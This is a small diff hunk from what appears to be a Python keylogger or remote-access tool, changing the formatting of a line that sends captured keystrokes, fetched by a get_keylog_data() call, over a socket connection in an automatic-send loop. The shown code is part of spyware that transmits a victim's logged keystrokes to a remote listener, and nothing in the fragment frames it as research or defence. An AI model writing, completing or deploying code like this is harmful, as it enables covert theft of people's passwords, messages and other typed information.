@@ -173,7 +173,7 @@ def listen(c):
         while True:
             if buffer_auto_send_pending:
                 data = get_keylog_data()
-                c.send(f'[AUTO-SEND] {data}\n[AUTO-SEND]\n'.encode())
+                c.send(f'[AUTO-SEND] {data}\n[AUTO-SEND]\n\n'.encode())
                 buffer_auto_send_pending = False
                 
                 c.settimeout(.5)
